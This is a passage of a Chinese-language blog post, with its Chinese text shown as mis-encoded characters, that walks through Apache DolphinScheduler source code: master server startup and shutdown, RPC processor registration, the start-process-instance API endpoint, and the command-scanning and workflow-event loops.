class="comment">//è¿™æ˜¯è°ƒåº¦å™¨çš„æ¥å£ï¼ŒåŒ…å«æ“ä½œè°ƒåº¦ä»»åŠ¡çš„æ–¹æ³•ã€‚</span></span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.schedulerApi.start();</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">if</span> (Stopper.isRunning()) &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â close(<span class="string">&quot;MasterServer shutdownHook&quot;</span>);</span><br><span class="line"> Â  Â  Â  Â  Â  Â &#125;</span><br><span class="line"> Â  Â  Â  Â &#125;));</span><br><span class="line"> Â  Â &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> Â  Â  * ä¼˜é›…çš„å…³é—­æ–¹æ³•</span></span><br><span class="line"><span class="comment"> Â  Â  *</span></span><br><span class="line"><span class="comment"> Â  Â  * <span class="doctag">@param</span> cause å…³é—­çš„åŸå› </span></span><br><span class="line"><span class="comment"> Â  Â  */</span></span><br><span class="line"> Â  Â <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(String cause)</span> &#123;</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// set stop signal is true</span></span><br><span class="line"><span class="comment">// execute only once</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">if</span> (!Stopper.stop()) &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â logger.warn(<span class="string">&quot;MasterServer is already stopped, current cause: &#123;&#125;&quot;</span>, cause);</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span>;</span><br><span class="line"> Â  Â  Â  Â  Â  Â &#125;</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â  Â  Â logger.info(<span class="string">&quot;Master server is stopping, current cause : &#123;&#125;&quot;</span>, cause);</span><br><span class="line"></span><br><span class="line"><span class="comment">// thread sleep 3 seconds for thread quietly stop</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â ThreadUtils.sleep(Constants.SERVER_CLOSE_WAIT_TIME.toMillis());</span><br><span class="line"><span class="comment">// close</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="built_in">this</span>.schedulerApi.close();</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="built_in">this</span>.masterSchedulerService.close();</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="built_in">this</span>.masterRPCServer.close();</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="built_in">this</span>.masterRegistryClient.closeRegistry();</span><br><span class="line"><span class="comment">// close spring Context and will invoke method with @PreDestroy annotation to destroy beans.</span></span><br><span class="line"><span class="comment">// like ServerNodeManager,HostManager,TaskResponseService,CuratorZookeeperClient,etc</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â springApplicationContext.close();</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â  Â  Â logger.info(<span class="string">&quot;MasterServer stopped, current cause: &#123;&#125;&quot;</span>, cause);</span><br><span class="line"> Â  Â  Â  Â &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â logger.error(<span class="string">&quot;MasterServer stop failed, current cause: &#123;&#125;&quot;</span>, cause, e);</span><br><span class="line"> Â  Â  Â  Â &#125;</span><br><span class="line"> Â  Â &#125;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Override</span></span><br><span class="line"> Â  Â <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">(String cause)</span> &#123;</span><br><span class="line"> Â  Â  Â  Â close(cause);</span><br><span class="line"> Â  Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨runæ–¹æ³•é‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸»è¦ä¾æ¬¡æ‰§è¡Œäº†ï¼š</p><ul><li>**â‘  MasterRPCServer.start()**ï¼šå¯åŠ¨masterçš„rpcæœåŠ¡ï¼›</li><li>**â‘¡ TaskPluginManager.installPlugin()**ï¼šå®‰è£…ä»»åŠ¡æ’ä»¶ï¼›</li><li>**â‘¢ MasterRegistryClient.start()**ï¼šå‘Zookeeperæ³¨å†ŒMasterServerï¼›</li><li>**â‘£ MasterSchedulerService.start()**ï¼šä¸»è°ƒåº¦ç¨‹åºçº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹å°†ä½¿ç”¨æ¥è‡ªæ•°æ®åº“çš„å‘½ä»¤å¹¶è§¦å‘æ‰§è¡Œçš„processInstanceã€‚</li><li>**â‘¤ EventExecuteService.start()**ï¼šå·¥ä½œæµå®ä¾‹æ‰§è¡Œæƒ…å†µ</li><li>**â‘¥ FailoverExecuteThread()**ï¼šæ•…éšœè½¬ç§»æ£€æµ‹</li><li>**â‘¦ SchedulerApi.start()**ï¼šscheduleræ¥å£å»æ“ä½œä»»åŠ¡å®ä¾‹</li></ul><p><strong>3.1.1 MasterRPCServer</strong></p><p><strong>DS</strong></p><p><strong>Master RPC Serverä¸»è¦ç”¨æ¥å‘é€æˆ–æ¥æ”¶è¯·æ±‚ç»™å…¶å®ƒç³»ç»Ÿ</strong>ã€‚</p><p>åˆå§‹åŒ–æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostConstruct</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// åˆå§‹åŒ–è¿œç¨‹æœåŠ¡</span></span><br><span class="line">    <span class="type">NettyServerConfig</span> <span class="variable">serverConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NettyServerConfig</span>();</span><br><span class="line">    serverConfig.setListenPort(masterConfig.getListenPort());</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer = <span class="keyword">new</span> <span class="title class_">NettyRemotingServer</span>(serverConfig);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RESPONSE, taskExecuteResponseProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RUNNING, taskExecuteRunningProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_KILL_RESPONSE, taskKillResponseProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.STATE_EVENT_REQUEST, stateEventProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_FORCE_STATE_EVENT_REQUEST, taskEventProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_WAKEUP_EVENT_REQUEST, taskEventProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.CACHE_EXPIRE, cacheProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.TASK_RECALL, taskRecallProcessor);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ—¥å¿—æœåŠ¡</span></span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.GET_LOG_BYTES_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.ROLL_VIEW_LOG_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.VIEW_WHOLE_LOG_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.registerProcessor(CommandType.REMOVE_TAK_LOG_REQUEST, loggerRequestProcessor);</span><br><span class="line">    <span class="built_in">this</span>.nettyRemotingServer.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.2.2 TaskPluginManager</strong></p><p><strong>DS</strong></p><p><img src="/images/image9.png" alt="Alt 9"><br><img src="/images/image10.png" alt="Alt 10"></p><p><img src="/images/image11.png" alt="Alt 11"></p><h2 id="åˆ°æ­¤éƒ¨åˆ†æºç è§£æå®Œæˆ"><a href="#åˆ°æ­¤éƒ¨åˆ†æºç è§£æå®Œæˆ" class="headerlink" title="åˆ°æ­¤éƒ¨åˆ†æºç è§£æå®Œæˆ"></a>åˆ°æ­¤éƒ¨åˆ†æºç è§£æå®Œæˆ</h2><p>æ•´ä½“æµç¨‹è¿è¡Œ</p><p><img src="/images/Untitled%202.png" alt="Untitled"></p><p>ç”¨æˆ·ç‚¹å‡»WEBç•Œé¢çš„å¯åŠ¨å·¥ä½œæµæŒ‰é’®ã€‚</p><p>apiserver å°è£… commnd åˆ° dbï¼ˆå¾€ t_ds_command è¡¨ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼‰ã€‚</p><p>master æ‰«æåˆ° commadï¼Œè¿›è¡Œ dga æ„å»ºï¼Œåˆå§‹åŒ–ï¼Œå°†æºå¤´ task æäº¤åˆ° priority é˜Ÿåˆ—ä¸­ã€‚</p><p>taskConsumer æ¶ˆè´¹é˜Ÿåˆ—æ•°æ®å¾—åˆ° taskï¼Œé€‰æ‹©ä¸€å° worker åˆ†é…ä»»åŠ¡ã€‚</p><p>worker æ¥æ”¶åˆ°åˆ†é…ä»»åŠ¡çš„æ¶ˆæ¯å¯åŠ¨ä»»åŠ¡ã€‚</p><p>worker è¿”å›ç»“æœç»™ masterï¼Œmaster æ›´æ–°ä»»åŠ¡ä¿¡æ¯åˆ° db ã€‚</p><p>03</p><p>DolphinScheduleræºç å‰–æ</p><p>3.1 apiserverä»»åŠ¡æ‰§è¡Œå…¥å£</p><p>å½“ç”¨æˆ·åœ¨å‰ç«¯ç‚¹å‡»æ‰§è¡Œä»»åŠ¡ï¼Œåˆ™ä¼šå‘æµ·è±šè°ƒåº¦çš„æ¥å£å‘é€è¯·æ±‚ï¼Œæœ€ç»ˆç”± ExecutorController çš„ startProcessInstance æ–¹æ³•æ¥å¤„ç†è¯·æ±‚ã€‚</p><p><img src="/images/Untitled%203.png" alt="Untitled"></p><p>ExecutorController.startProcessInstance() æ–¹æ³•ã€‚</p><p>æœ€ç»ˆä¼šå¾€ mysql è¡¨ t_ds_command æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†è¦è¿è¡Œçš„å·¥ä½œæµä¿¡æ¯å†™å…¥è¯¥è¡¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;start-process-instance&quot;)</span></span><br><span class="line"><span class="meta">@ResponseStatus(HttpStatus.OK)</span></span><br><span class="line"><span class="meta">@ApiException(START_PROCESS_INSTANCE_ERROR)</span></span><br><span class="line"><span class="meta">@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">startProcessInstance</span><span class="params">(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestAttribute(value = Constants.SESSION_USER)</span> User loginUser,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true)</span> <span class="meta">@PathVariable</span> <span class="type">long</span> projectCode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;processDefinitionCode&quot;)</span> <span class="type">long</span> processDefinitionCode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;scheduleTime&quot;)</span> String scheduleTime,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;failureStrategy&quot;)</span> FailureStrategy failureStrategy,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;startNodeList&quot;, required = false)</span> String startNodeList,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;taskDependType&quot;, required = false)</span> TaskDependType taskDependType,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;execType&quot;, required = false)</span> CommandType execType,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;warningType&quot;)</span> WarningType warningType,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;warningGroupId&quot;, required = false, defaultValue = &quot;0&quot;)</span> Integer warningGroupId,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;runMode&quot;, required = false)</span> RunMode runMode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;processInstancePriority&quot;, required = false)</span> Priority processInstancePriority,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;workerGroup&quot;, required = false, defaultValue = &quot;default&quot;)</span> String workerGroup,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;environmentCode&quot;, required = false, defaultValue = &quot;-1&quot;)</span> Long environmentCode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;timeout&quot;, required = false)</span> Integer timeout,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;startParams&quot;, required = false)</span> String startParams,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;expectedParallelismNumber&quot;, required = false)</span> Integer expectedParallelismNumber,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;dryRun&quot;, defaultValue = &quot;0&quot;, required = false)</span> <span class="type">int</span> dryRun,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;complementDependentMode&quot;, required = false)</span> ComplementDependentMode complementDependentMode)</span> &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (timeout == <span class="literal">null</span>) &#123;</span><br><span class="line">        timeout = Constants.MAX_TASK_TIMEOUT;</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;String, String&gt; startParamMap = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (startParams != <span class="literal">null</span>) &#123;</span><br><span class="line">        startParamMap = JSONUtils.toMap(startParams);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (complementDependentMode == <span class="literal">null</span>) &#123;</span><br><span class="line">        complementDependentMode = ComplementDependentMode.OFF_MODE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç”Ÿæˆcommndä¿¡æ¯å…¥åº“</span></span><br><span class="line">    Map&lt;String, Object&gt; result = execService.execProcessInstance(loginUser, projectCode, processDefinitionCode,</span><br><span class="line">            scheduleTime, execType, failureStrategy,</span><br><span class="line">            startNodeList, taskDependType, warningType, warningGroupId, runMode, processInstancePriority,</span><br><span class="line">            workerGroup, environmentCode, timeout, startParamMap, expectedParallelismNumber, dryRun, complementDependentMode);</span><br><span class="line">    <span class="keyword">return</span> returnDataList(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.2 master è°ƒåº¦ä»»åŠ¡</p><p>3.2.1  masterå¯åŠ¨</p><p>DS</p><p>MasterServer.run() æ–¹æ³•</p><p>å¯åŠ¨ master çš„å·¥ä½œçº¿ç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> SchedulerException &#123;</span><br><span class="line"><span class="comment">// init rpc server</span></span><br><span class="line"><span class="built_in">this</span>.masterRPCServer.start();<span class="comment">//å¯åŠ¨netty rpcæœåŠ¡ï¼Œä¸workeré€šä¿¡ä½¿ç”¨</span></span><br><span class="line"><span class="comment">// install task plugin</span></span><br><span class="line"><span class="built_in">this</span>.taskPluginManager.loadPlugin();<span class="comment">//åŠ è½½taskplugin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// self tolerant</span></span><br><span class="line"><span class="built_in">this</span>.masterRegistryClient.init();<span class="comment">//åŠ è½½é«˜å¯ç”¨çš„ä¸€äº›æ³¨å†Œä¿¡æ¯</span></span><br><span class="line"><span class="built_in">this</span>.masterRegistryClient.start();</span><br><span class="line"><span class="built_in">this</span>.masterRegistryClient.setRegistryStoppable(<span class="built_in">this</span>);</span><br><span class="line"><span class="comment">//commandæ‰«æçº¿ç¨‹</span></span><br><span class="line"><span class="built_in">this</span>.masterSchedulerBootstrap.init();</span><br><span class="line"><span class="built_in">this</span>.masterSchedulerBootstrap.start();</span><br><span class="line"><span class="comment">//äº‹ä»¶å¤„ç†çº¿ç¨‹</span></span><br><span class="line"><span class="built_in">this</span>.eventExecuteService.start();</span><br><span class="line"><span class="built_in">this</span>.failoverExecuteThread.start();</span><br><span class="line"><span class="comment">//å®šæ—¶è°ƒåº¦</span></span><br><span class="line"><span class="built_in">this</span>.schedulerApi.start();</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (Stopper.isRunning()) &#123;</span><br><span class="line">        close(<span class="string">&quot;MasterServer shutdownHook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.2.2 commandæ‰«æ</p><p>DS</p><p>MasterSchedulerBootstrap.run()æ–¹æ³•</p><p>è¯¥çº¿ç¨‹åœ¨3.2.1å¯åŠ¨ï¼Œå¯åŠ¨ä¹‹åï¼Œè¿›å…¥å¾ªç¯ï¼Œä¸€ç›´æ‰«æ command è¡¨ï¼ŒæŸ¥è¯¢å‡º commandï¼Œç„¶åå°è£…æˆ processInstants å…¥åº“ï¼Œåˆ›å»º WorkflowExecuteRunnable (æ­¤å¯¹è±¡åç»­å¾ˆå¤šåœ°æ–¹ç”¨åˆ°) å†™å…¥åˆ° workflowEventQueue ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (Stopper.isRunning()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// todo: if the workflow event queue is much, we need to handle the back pressure</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isOverload</span> <span class="operator">=</span></span><br><span class="line">                    OSUtils.isOverload(masterConfig.getMaxCpuLoadAvg(), masterConfig.getReservedMemory());</span><br><span class="line">            <span class="keyword">if</span> (isOverload) &#123;</span><br><span class="line">                MasterServerMetrics.incMasterOverload();</span><br><span class="line">                Thread.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            List&lt;Command&gt; commands = findCommands();</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(commands)) &#123;</span><br><span class="line">                <span class="comment">// indicate that no command ,sleep for 1s</span></span><br><span class="line">                Thread.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//å°†commandè½¬æ¢æˆprocessInstance,å¹¶å…¥åº“</span></span><br><span class="line">            List&lt;ProcessInstance&gt; processInstances = command2ProcessInstance(commands);</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(processInstances)) &#123;</span><br><span class="line">                <span class="comment">// indicate that the command transform to processInstance error, sleep for 1s</span></span><br><span class="line">                Thread.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            MasterServerMetrics.incMasterConsumeCommand(commands.size());</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            processInstances.forEach(processInstance -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    LoggerUtils.setWorkflowInstanceIdMDC(processInstance.getId());</span><br><span class="line">                    <span class="keyword">if</span> (processInstanceExecCacheManager.contains(processInstance.getId())) &#123;</span><br><span class="line">                        logger.error(<span class="string">&quot;The workflow instance is already been cached, this case shouldn&#x27;t be happened&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">WorkflowExecuteRunnable</span> <span class="variable">workflowRunnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkflowExecuteRunnable</span>(processInstance,</span><br><span class="line">                            processService,</span><br><span class="line">                            nettyExecutorManager,</span><br><span class="line">                            processAlertManager,</span><br><span class="line">                            masterConfig,</span><br><span class="line">                            stateWheelExecuteThread,</span><br><span class="line">                            curingGlobalParamsService);</span><br><span class="line">                    processInstanceExecCacheManager.cache(processInstance.getId(), workflowRunnable);<span class="comment">//processInstanceExecCacheManagerè®¾ç½®è¿›cache è¢«  workflowEventLoopè·å–</span></span><br><span class="line">                    workflowEventQueue.addEvent(<span class="keyword">new</span> <span class="title class_">WorkflowEvent</span>(WorkflowEventType.START_WORKFLOW,</span><br><span class="line">                            processInstance.getId()));</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    LoggerUtils.removeWorkflowInstanceIdMDC();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException interruptedException) &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;Master schedule bootstrap interrupted, close the loop&quot;</span>, interruptedException);</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Master schedule workflow error&quot;</span>, e);</span><br><span class="line">            <span class="comment">// sleep for 1s here to avoid the database down cause the exception boom</span></span><br><span class="line">            ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>}<br>3.2.3 workerFlowEventæ¶ˆè´¹</p><p>DS</p><p>åœ¨ command æ‰«æçº¿ç¨‹ä¸­å¯åŠ¨äº† workflowEventLooper çº¿ç¨‹ç”¨äºæ¶ˆè´¹ workerFlowEvent ã€‚</p><p>MasterSchedulerBootstrap.start() æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;Master schedule bootstrap starting..&quot;</span>);</span><br><span class="line">    <span class="built_in">super</span>.start();</span><br><span class="line">    workflowEventLooper.start();<span class="comment">//å·¥ä½œæµè°ƒåº¦çº¿ç¨‹å¯åŠ¨</span></span><br><span class="line">    logger.info(<span class="string">&quot;Master schedule bootstrap started...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»workflowEventQueue æ‹‰å– workflowevent äº‹ä»¶ï¼Œè°ƒç”¨ workflowEventHandler å¤„ç†è¯¥äº‹ä»¶ã€‚</p><p><strong>WorkflowEventLooper.run()æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">WorkflowEvent</span> <span class="variable">workflowEvent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> (Stopper.isRunning()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            workflowEvent = workflowEventQueue.poolEvent();<span class="comment">//æ‹‰å–workflowevent</span></span><br><span class="line">            LoggerUtils.setWorkflowInstanceIdMDC(workflowEvent.getWorkflowInstanceId());</span><br><span class="line">            logger.info(<span class="string">&quot;Workflow event looper receive a workflow event: &#123;&#125;, will handle this&quot;</span>, workflowEvent);</span><br><span class="line">            <span class="type">WorkflowEventHandler</span> <span class="variable">workflowEventHandler</span> <span class="operator">=</span></span><br><span class="line">                workflowEventHandlerMap.get(workflowEvent.getWorkflowEventType());<span class="comment">//è·å–workfloweventï¼Œå¤„ç†workfloweventäº‹ä»¶</span></span><br><span class="line">            workflowEventHandler.handleWorkflowEvent(workflowEvent);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;WorkflowEventLooper thread is interrupted, will close this loop&quot;</span>, e);</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (WorkflowEventHandleException workflowEventHandleException) &#123;</span><br><span class="line">            logger.error(<span 